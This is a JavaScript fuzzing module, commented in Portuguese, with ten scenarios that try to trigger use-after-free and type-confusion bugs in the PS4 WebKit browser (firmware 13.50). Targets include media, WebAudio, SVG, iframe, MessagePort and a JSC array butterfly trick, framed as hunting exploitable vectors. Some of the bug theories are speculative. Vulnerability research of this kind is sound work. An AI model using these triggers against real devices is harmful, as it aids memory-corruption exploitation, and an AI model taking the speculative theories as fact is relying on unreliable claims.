/**
 * MOD_FACTORY.JS — Cenários de UAF para PS4 WebKit FW 13.50
 *
 * Cada cenário implementa o ciclo completo de um UAF:
 *   setup()   → cria o objeto alvo e a infraestrutura necessária
 *   trigger() → executa a ação que LIBERA o objeto nativo (free)
 *   probe[]   → lista de funções que ACESSAM o objeto pós-free
 *   cleanup() → remove efeitos colaterais do DOM/contexto
 *
 * As probes recebem o próprio cenário (`s`) como parâmetro
 * para acessar `s.video`, `s.ctx`, etc. de forma explícita.
 *
 * Superfícies de alta prioridade para PS4 FW 13.50:
 *   - MediaPlayerPrivateManx / FullscreenVideoController
 *   - WebAudio graph (AudioContext.close → nodes órfãos)
 *   - MediaSource pipeline teardown
 *   - SVG RenderSVGResourceFilter lifetime
 *   - FrameLoader / Frame teardown via document.write
 *   - MessagePort ownership transfer
 */

export const Factory = {

    buildScenarios: function() {
        const list = [];

        const register = (scenario) => {
            // Verifica suporte de API antes de adicionar
            try {
                if (scenario.supported && scenario.supported() === false) return;
                list.push(scenario);
            } catch(e) {}
        };

        // ══════════════════════════════════════════════════════════════
        // 1. HTMLVideoElement UAF via remove() durante fullscreen
        //    C++: FullscreenVideoController.cpp / MediaPlayerPrivateManx
        //    Risco: ALTO — vetor documentado no FW 12.xx, pode persistir
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'VIDEO_FULLSCREEN_REMOVE',
            category: 'Media',
            risk: 'HIGH',
            description: [
                'HTMLVideoElement.remove() enquanto FullscreenVideoController mantém',
                'ponteiro bruto para o MediaPlayerPrivate. Se o refcount chegar a zero',
                'antes de webkitExitFullscreen(), o controlador acessa objeto freed.'
            ].join(' '),

            setup: function() {
                this.container = document.createElement('div');
                document.body.appendChild(this.container);
                this.video = document.createElement('video');
                this.video.setAttribute('playsinline', '');
                this.video.setAttribute('preload', 'auto');
                // Minimal MP4 — força criação do objeto MediaPlayerPrivate nativo
                this.video.src = 'data:video/mp4;base64,AAAAFGZ0eXBtcDQyAAAAAG1wNDI=';
                this.container.appendChild(this.video);
            },

            trigger: function() {
                this.video.remove();             // refcount DOM → 0
                document.webkitExitFullscreen?.(); // acessa controller com objeto freed?
            },

            probe: [
                s => s.video.duration,
                s => s.video.currentTime,
                s => s.video.readyState,
                s => s.video.networkState,
                s => s.video.videoWidth,
                s => s.video.videoHeight,
                s => s.video.buffered?.length,
                s => s.video.played?.length,
                s => s.video.seekable?.length,
                s => s.video.error?.code,
            ],

            cleanup: function() {
                try { this.container.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 2. AudioContext.close() → AudioNodes órfãos acessam C++ freed
        //    C++: AudioContext.cpp / AudioNode.cpp
        //    Risco: ALTO — histórico massivo de UAF no WebAudio em geral
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'AUDIO_CTX_CLOSE_NODE_ACCESS',
            category: 'WebAudio',
            risk: 'HIGH',
            description: [
                'AudioContext.close() destrói o objeto C++ e encerra o grafo de áudio.',
                'Mas JS ainda mantém referências vivas para os AudioNodes filhos.',
                'Acessar AudioParam.value ou AudioNode.context depois do close()',
                'pode dereferenciar ponteiro freed.'
            ].join(' '),

            setup: async function() {
                let AC = window.AudioContext || window.webkitAudioContext;
                this.ctx = new AC();
                this.osc  = this.ctx.createOscillator();
                this.biq  = this.ctx.createBiquadFilter();
                this.gain = this.ctx.createGain();
                this.dyn  = this.ctx.createDynamicsCompressor();
                // Conecta o grafo
                this.osc.connect(this.biq);
                this.biq.connect(this.gain);
                this.gain.connect(this.dyn);
                this.dyn.connect(this.ctx.destination);
            },

            trigger: async function() {
                await this.ctx.close(); // Destrói todos os objetos C++ do grafo
            },

            probe: [
                s => s.osc.frequency.value,       // AudioParam → objeto C++ freed?
                s => s.osc.detune.value,
                s => s.osc.type,
                s => s.biq.frequency.value,
                s => s.biq.Q.value,
                s => s.biq.gain.value,
                s => s.biq.type,
                s => s.gain.gain.value,
                s => s.dyn.threshold.value,
                s => s.dyn.ratio.value,
                s => s.osc.context,               // Ref de volta para ctx fechado
                s => s.osc.numberOfInputs,
                s => s.osc.numberOfOutputs,
                s => s.osc.channelCount,
            ],

            cleanup: function() {}
        });

        // ══════════════════════════════════════════════════════════════
        // 3. HTMLVideoElement.src = '' enquanto MediaSource ativa
        //    C++: MediaSource.cpp / SourceBuffer.cpp
        //    Risco: ALTO — teardown do pipeline de decodificação
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'MEDIASOURCE_SRC_CLEAR_UAF',
            category: 'Media',
            risk: 'HIGH',
            description: [
                'Limpa video.src enquanto o MediaSource ainda tem SourceBuffers ativos.',
                'O pipeline de decodificação pode ser destroyed antes da teardown completa,',
                'deixando SourceBuffer com ponteiro freed para o MediaSource.'
            ].join(' '),
            supported: () => typeof MediaSource !== 'undefined',

            setup: function() {
                this.ms   = new MediaSource();
                this.url  = URL.createObjectURL(this.ms);
                this.video = document.createElement('video');
                this.video.src = this.url;
                document.body.appendChild(this.video);
                // Guarda referência para o MS e ao URL antes do free
                this.msRef = this.ms;
            },

            trigger: function() {
                URL.revokeObjectURL(this.url); // Revoga o handle nativo
                this.video.src = '';           // Desconecta elemento → pipeline teardown
                this.ms = null;                // Remove strong ref JS
            },

            probe: [
                s => s.video.duration,
                s => s.video.readyState,
                s => s.video.networkState,
                s => s.video.error?.code,
                s => s.msRef.readyState,       // Acessa objeto freed via ref retida
                s => s.msRef.duration,
                s => s.msRef.sourceBuffers?.length,
                s => s.msRef.activeSourceBuffers?.length,
            ],

            cleanup: function() {
                try { this.video.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 4. SVG Filter removido enquanto elemento HTML o referencia via CSS
        //    C++: RenderSVGResourceFilter.cpp / FilterEffect lifetime
        //    Risco: MÉDIO-ALTO
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'SVG_CSS_FILTER_UAF',
            category: 'Rendering',
            risk: 'MEDIUM',
            description: [
                'SVGFilterElement removido do DOM enquanto um elemento HTML',
                'ainda o referencia via CSS filter:url(#id).',
                'O RenderSVGResourceFilter pode ser freed durante relayout,',
                'mas o RenderElement ainda mantém ponteiro para ele.'
            ].join(' '),

            setup: function() {
                this.style = document.createElement('style');
                this.style.textContent = [
                    '@keyframes fuzz { 0%{opacity:1} 100%{opacity:0} }',
                    '.fuzz-t { animation: fuzz 0.05s linear infinite;',
                    '          filter: url(#fuzz-svgf);',
                    '          width:50px; height:50px; background:red; }'
                ].join('\n');
                document.head.appendChild(this.style);

                this.svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
                this.svg.style.cssText = 'position:absolute;width:1px;height:1px;overflow:hidden';
                this.svg.innerHTML = [
                    '<filter id="fuzz-svgf">',
                    '  <feGaussianBlur stdDeviation="3"/>',
                    '  <feColorMatrix type="matrix"',
                    '    values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 18 -7"/>',
                    '</filter>'
                ].join('');
                document.body.appendChild(this.svg);

                this.el = document.createElement('div');
                this.el.className = 'fuzz-t';
                document.body.appendChild(this.el);

                this.filterRef = this.svg.querySelector('#fuzz-svgf');
            },

            trigger: function() {
                this.svg.remove(); // Free do RenderSVGResourceFilter
                // Força um relayout imediato para pressionar o ponteiro freed
                void this.el.getBoundingClientRect();
            },

            probe: [
                s => s.el.getBoundingClientRect().width,
                s => getComputedStyle(s.el).filter,
                s => s.el.getAnimations?.().length,
                s => s.filterRef.getAttribute('id'),
                s => s.filterRef.parentNode,
                s => s.filterRef.ownerDocument,
            ],

            cleanup: function() {
                try { this.el.remove(); this.style.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 5. document.write() em iframe destrói Frame enquanto ref mantida
        //    C++: FrameLoader.cpp / Frame.cpp
        //    Risco: ALTO — frame teardown é superfície clássica de UAF
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'IFRAME_DOCWRITE_FRAME_UAF',
            category: 'DOM',
            risk: 'HIGH',
            description: [
                'document.write() no iframe destrói e recria o objeto Frame nativo.',
                'Referências JS externas para iframeDoc e iframeWin podem',
                'apontar para o Frame antigo já freed, especialmente ao',
                'acessar propriedades de navegação.'
            ].join(' '),

            setup: function() {
                this.iframe = document.createElement('iframe');
                document.body.appendChild(this.iframe);
                // Captura refs ANTES da reescrita
                this.oldWin = this.iframe.contentWindow;
                this.oldDoc = this.iframe.contentDocument;
            },

            trigger: function() {
                // document.write() força teardown do Frame antigo e criação de um novo
                try {
                    this.oldDoc.open();
                    this.oldDoc.write('<html><body><p id="new">REWRITTEN</p></body></html>');
                    this.oldDoc.close();
                } catch(e) {}
            },

            probe: [
                // Acessa refs do documento/janela ANTIGOS (potencialmente freed)
                s => s.oldDoc.body?.innerHTML,
                s => s.oldDoc.URL,
                s => s.oldDoc.readyState,
                s => s.oldDoc.documentElement?.outerHTML,
                s => s.oldWin.location?.href,
                s => s.oldWin.document === s.iframe.contentDocument, // Deve mudar
                s => s.oldDoc.getElementById?.('new'),
                s => s.oldDoc.querySelector?.('p'),
            ],

            cleanup: function() {
                try { this.iframe.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 6. Event listener disparado em elemento removido do DOM
        //    C++: EventTarget + RenderObject
        //    Risco: MÉDIO
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'DOM_EVENT_REMOVED_ELEMENT',
            category: 'DOM',
            risk: 'MEDIUM',
            description: [
                'dispatchEvent() em elemento removido do DOM.',
                'O RenderObject pode ter sido freed, mas o JS EventTarget',
                'ainda processa o evento e tenta acessar layout/geometry.'
            ].join(' '),

            setup: function() {
                this.el = document.createElement('div');
                this.el.style.cssText = 'width:100px;height:100px;background:#222;position:absolute';
                this.callbackResults = [];
                // Listener acessa layout durante o callback
                this.el.addEventListener('customevent', () => {
                    try {
                        this.callbackResults.push({
                            rect: this.el.getBoundingClientRect(),
                            offset: this.el.offsetWidth,
                            computed: getComputedStyle(this.el).width
                        });
                    } catch(ex) { this.callbackResults.push({ error: ex.message }); }
                });
                document.body.appendChild(this.el);
            },

            trigger: function() {
                this.el.remove(); // Destrói RenderObject
            },

            probe: [
                s => { s.el.dispatchEvent(new Event('customevent')); return s.callbackResults.length; },
                s => s.el.getBoundingClientRect().width,
                s => s.el.offsetWidth,
                s => s.el.clientWidth,
                s => s.el.scrollWidth,
                s => s.el.isConnected,
                s => s.el.ownerDocument,
                s => s.el.getRootNode(),
                s => getComputedStyle(s.el).width,
            ],

            cleanup: function() {}
        });

        // ══════════════════════════════════════════════════════════════
        // 7. MessagePort transferido mas referência JS mantida
        //    C++: MessagePort.cpp / MessagePortChannel
        //    Risco: MÉDIO
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'MESSAGEPORT_TRANSFER_UAF',
            category: 'IPC',
            risk: 'MEDIUM',
            description: [
                'postMessage() com transferList transfere a ownership do MessagePort',
                'para outro contexto. O wrapper JS fica "neutered", mas se o objeto',
                'C++ não for properly detachado, a referência retida pode acessar',
                'memória freed ao chamar métodos no port transferido.'
            ].join(' '),

            setup: function() {
                this.mc      = new MessageChannel();
                this.portRef = this.mc.port1; // ref que vai sobreviver ao transfer
                this.portRef.start();
                this.mc.port2.start();
                this.mc.port2.onmessage = () => {};
            },

            trigger: function() {
                this.iframe = document.createElement('iframe');
                this.iframe.src = 'about:blank';
                document.body.appendChild(this.iframe);
                try {
                    // Transfer de port1 → portRef fica como wrapper neutered
                    this.iframe.contentWindow.postMessage('x', '*', [this.mc.port1]);
                } catch(e) {}
            },

            probe: [
                s => s.portRef.onmessage,
                s => s.portRef.onmessageerror,
                s => { try { s.portRef.postMessage('probe'); return 'ok'; } catch(e) { return e.message; } },
                s => { try { s.portRef.start?.(); return 'ok'; } catch(e) { return e.message; } },
                s => { try { s.portRef.close?.(); return 'ok'; } catch(e) { return e.message; } },
            ],

            cleanup: function() {
                try { this.iframe?.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 8. CSS Animation em elemento removido durante animação
        //    C++: CSSAnimationController / RenderStyle
        //    Risco: MÉDIO
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'CSS_ANIMATION_REMOVED_ELEMENT',
            category: 'Rendering',
            risk: 'MEDIUM',
            description: [
                'Remove elemento do DOM enquanto CSS animation está ativa.',
                'O CSSAnimationController pode manter timer callbacks que',
                'disparam sobre RenderObject freed durante o próximo frame.'
            ].join(' '),

            setup: function() {
                this.style = document.createElement('style');
                this.style.textContent = [
                    '@keyframes fuzz2 { 0%{transform:translateX(0)} 100%{transform:translateX(100px)} }',
                    '.fuzz-anim { animation: fuzz2 0.1s linear infinite;',
                    '             width:50px;height:50px;background:blue;position:absolute }'
                ].join('\n');
                document.head.appendChild(this.style);

                this.el = document.createElement('div');
                this.el.className = 'fuzz-anim';
                this.animEvents = [];
                this.el.addEventListener('animationiteration', () => {
                    try { this.animEvents.push(this.el.getBoundingClientRect()); } catch(e) {}
                });
                this.el.addEventListener('animationend', () => {
                    try { this.animEvents.push({ end: true, style: getComputedStyle(this.el).transform }); } catch(e) {}
                });
                document.body.appendChild(this.el);
            },

            trigger: function() {
                this.el.remove(); // Remove durante animação ativa
            },

            probe: [
                s => s.el.getAnimations?.().length,
                s => s.el.getBoundingClientRect().x,
                s => getComputedStyle(s.el).transform,
                s => getComputedStyle(s.el).animationPlayState,
                s => s.animEvents.length,
            ],

            cleanup: function() {
                try { this.style.remove(); } catch(e) {}
            }
        });
        // ══════════════════════════════════════════════════════════════
        // 9. NodeIterator / TreeWalker Mutation (Type Confusion Target)
        //    C++: NodeIterator.cpp / TreeWalker.cpp
        //    Risco: ALTO — Especialista em causar Boolean Flips e Nulls
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'TREEWALKER_TYPE_CONFUSION',
            category: 'DOM',
            risk: 'HIGH',
            description: [
                'Um TreeWalker retém ponteiros nativos C++ para nós do DOM.',
                'Se o DOM sob ele for agressivamente destruído e recriado com',
                'elementos de tipos diferentes, chamar nextNode() pode retornar',
                'um tipo diferente, null inesperado, ou inverter booleanos do nó.'
            ].join(' '),

            setup: function() {
                this.sandbox = document.createElement('div');
                this.sandbox.innerHTML = '<span>A</span><b>B</b><i>C</i>';
                document.body.appendChild(this.sandbox);
                
                // Cria o walker travado no <b>
                this.walker = document.createTreeWalker(this.sandbox, NodeFilter.SHOW_ALL, null, false);
                this.walker.nextNode(); // Vai para o span
                this.walker.nextNode(); // Vai para o b
                
                // Ref para o nó alvo (para comparar booleanos e tipos)
                this.targetNode = this.walker.currentNode;
            },

            trigger: function() {
                // Mutação agressiva! Destrói os nós onde o Walker está pisando.
                this.sandbox.innerHTML = '<video></video><audio></audio>';
                // O C++ tenta atualizar o ponteiro do walker internamente...
            },

            probe: [
                s => s.walker.currentNode.nodeType,
                s => s.walker.currentNode.nodeName,
                s => s.walker.currentNode.isConnected, // Booleano! Pode inverter!
                s => s.walker.previousNode() !== null, // Boolean: Deve retornar null ou objeto válido
                s => s.targetNode.nodeType,            // Verifica o nó original isolado
                s => s.targetNode.isConnected          // Era true, deve virar false. Se virar undefined = Type Confusion!
            ],

            cleanup: function() {
                try { this.sandbox.remove(); } catch(e) {}
            }
        });

        // ══════════════════════════════════════════════════════════════
        // 10. JSC Array Butterfly Type Confusion
        //     C++: JSArray.cpp / JSObject.h
        //     Risco: CRÍTICO — O vetor mais valioso para exploits e Bounties
        // ══════════════════════════════════════════════════════════════
        register({
            id: 'JSC_ARRAY_BUTTERFLY_CONFUSION',
            category: 'CoreJS',
            risk: 'HIGH',
            description: [
                'Tenta forçar uma transição no JSCell IndexingType (de Double para Contiguous)',
                'durante uma operação síncrona. Se o motor não atualizar o ponteiro do',
                'Butterfly a tempo, ele vai ler um número Float como se fosse um',
                'ponteiro de Objeto (vazando endereço) ou retornar undefined/null fantasma.'
            ].join(' '),

            setup: function() {
                // Cria um array puro de Doubles (IndexingType = ALL_DOUBLE_INDEXING_TYPES)
                this.vulnArray = [1.1, 2.2, 3.3, 4.4, 5.5];
                
                // Um objeto malicioso que será injetado
                this.evilObject = { 
                    valueOf: () => {
                        // O GATILHO: Durante uma conversão implícita, mudamos o tipo do array
                        // ao injetar um objeto nele. Isso força a realocação do Butterfly
                        // de Double para Contiguous (Objetos).
                        this.vulnArray[1] = {};
                        
                        // Forçamos o GC para tentar limpar o Butterfly antigo
                        let trash = [];
                        for(let i=0; i<10; i++) trash.push(new ArrayBuffer(1024*1024));
                        return 1337;
                    }
                };
            },

            trigger: function() {
                try {
                    // Operação que aciona leitura interna do C++ e chama o valueOf do evilObject
                    // O C++ começa a ler assumindo que são Doubles, o evilObject muda o tipo a meio,
                    // e o C++ termina a leitura com o tipo errado.
                    Math.max(this.vulnArray[0], this.evilObject, this.vulnArray[2]);
                } catch(e) {}
            },

            probe: [
                // Se o Array sofreu Type Confusion, índices que eram números (ex: 3.3)
                // podem subitamente ser interpretados como "undefined", "null" ou objetos corrompidos.
                s => s.vulnArray[0],
                s => s.vulnArray[2],
                s => s.vulnArray[3],
                s => s.vulnArray[4],
                s => typeof s.vulnArray[3], // Era 'number'. Se for 'undefined' ou 'object', BINGO!
            ],

            cleanup: function() {
                this.vulnArray = null;
                this.evilObject = null;
            }
        });

        return list;
    }
};
